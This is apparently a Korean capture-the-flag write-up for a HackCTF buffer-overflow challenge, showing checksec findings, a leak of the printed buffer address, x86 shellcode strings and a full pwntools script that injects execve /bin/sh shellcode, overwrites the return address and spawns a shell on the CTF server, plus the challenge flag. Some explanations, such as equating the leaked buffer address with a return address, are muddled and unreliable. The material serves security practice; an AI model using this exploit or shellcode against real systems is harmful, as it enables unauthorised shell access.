

풀이


checksec 를 했을떄 현재 부분적으로만 RELRO 만 켜져있으므로 go 오버라이팅 방법은 일단 제외하고
시작하자.

나머지부분에 보호기법이 걸려있는것이 없으니

1. 버퍼 + 쉘코드 이용하는방법을 생각해보고
2. 버퍼 + RET 인데 현재 bin/bash 를 향하는 함수가 현재 존재하지않으므로 이러한 방법으로는 
풀지않는다.


따라서 우리는 쉘코드를 삽입해서 그것을 읽어서 풀어야한다.

다만 setvbuf 함수가 버퍼를 초기화하는 역할을 해서 한번 생각해보면서 코드를 작성해야한다.

즉 버퍼 + 쉘코드 삽입으로 풀면되는 문제


이제한번 페이로드를 작성해보자.

기초

1. 버퍼 크기

2. 쉘코드


버퍼 크기는 현재 총 27952 + 8(SFP) = 27960 이다.

여기서 또 나머지 8바이트가 RET 주소이다.

이제 RET 주소를 찾아야하는데

이제 SImple 파일에 

nc ctf.j0n9hyun.xyz 3005 를 입력했는데

계속해서 ret 주소가 바뀐다 주소가 유동적이어서 즉 (ASLR 이 걸려있다)

(ASLR : 공격자가 혼란스럽게 하기위해 메모리주소가 계속해서 바뀌는 보호기법)

이것을 우리가 주소를 잡아줘야하는데 그것을 leak 하는것이다.

즉 p.recvline or p.recvuntil() 로 필요없는 문자열들을 모두 받은뒤 

buf_addr(변수) = int(p.recv(16)[0:],16) 으로 받으면 된다.

(변수 설정후 p.recv로 16진수로 받고 그 모두를 16자리 즉 전부 읽으면된다.)


그리고 쉘코드는 버퍼가 매우크기떄문에 34비트를 기반으로한 
31 바이트 크기에 64바이트 쉘코드를 넣는것이 좋다.

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80




이제 페이로드를 작성해 보자면


쉘코드 + (27960 - 31)27929 + ret 주소(고정된주소) > p64(buf_addr)



from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3005)

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

p.recvline()			# leak 하는법 	# \n까지 입력받기떄문에 입력할떄 띄어쓰기를 조심해야한다.
p.recvuntil('buf:')
buf_addr = int(p.recv(16)[0:],16)		# >> leak 기법

payload = shellcode + "A"*27929 + p64(buf_addr)

p.sendline(payload)
p.interactive()



이것을 hack.py 로 작성해여서

python hack.py 를 해주면

접속이된다. 성공적으로 쉘을 획득한것이다.

따라서 

cat flag 를 실행해 플래그를 획득하면 끝이다.


# tip

# 이렇게 아무 버퍼나 입력했을떄 주소가 나오면 그것을 그 프로그램의 ret 주소라고 의심해보아라

매번 주소가 바뀌면 더욱더 확실하다 메모리보호기법이 걸려있기 떄문

그리고 기본적으로 쉘을 획득하는 방법은 


버퍼 + 쉘코드

버퍼 + ret 주소 이다.

이번 recv 사용법을 잊지말아라 이렇게 주소가 바뀌고 난잡할떄는 
전부 읽고 leak 해주면 된다. p.recv[16(16진수)][0:](슬라이싱기법) , 16 (16자리 전부)]

제일중요한거 recvline 이나 recvuntil 등을 쓸떄 str 쪽 띄어쓰기 주의하기 python 컴파일 돌리는데 오류가 생길수있음

flag >> HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}







